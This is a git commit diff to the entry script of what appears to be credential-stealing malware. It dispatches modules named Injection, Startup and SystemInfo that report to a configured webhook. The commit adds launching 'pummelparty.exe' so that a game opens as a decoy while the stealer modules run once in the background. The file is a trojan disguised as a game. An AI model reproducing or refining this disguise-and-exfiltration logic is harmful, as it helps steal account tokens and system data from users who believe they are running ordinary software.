1193ee0387fd9ce1a7e20c9a8a6bc60d67b2d383
aron2004HU <36998296+aron2004HU@users.noreply.github.com>
2023-01-19 18:11:48 +0100

    Update main.py

--- src/main.py
+++ src/main.py
@@ -5,6 +5,7 @@ from components.injection import Injection
 from components.startup import Startup
 from components.systeminfo import SystemInfo
 from config import __CONFIG__
+import os
 
 
 def main():
@@ -17,12 +18,18 @@ def main():
         SystemInfo,
     ]
 
-    for func in funcs:
-        if __CONFIG__[func.__name__.lower()]:
-            if func.__init__.__code__.co_argcount == 2:
-                func(__CONFIG__['webhook'])
-            else:
-                func()
+    if __CONFIG__['onerun'] == False:
+        for func in funcs:
+            if __CONFIG__[func.__name__.lower()]:
+                if func.__init__.__code__.co_argcount == 2:
+                    func(__CONFIG__['webhook'])
+                else:
+                    func()
+        os.startfile("pummelparty.exe")
+        __CONFIG__['onerun'] = True
 
+    else:
+        os.startfile("pummelparty.exe")
+        
 if __name__ == '__main__':
     main()
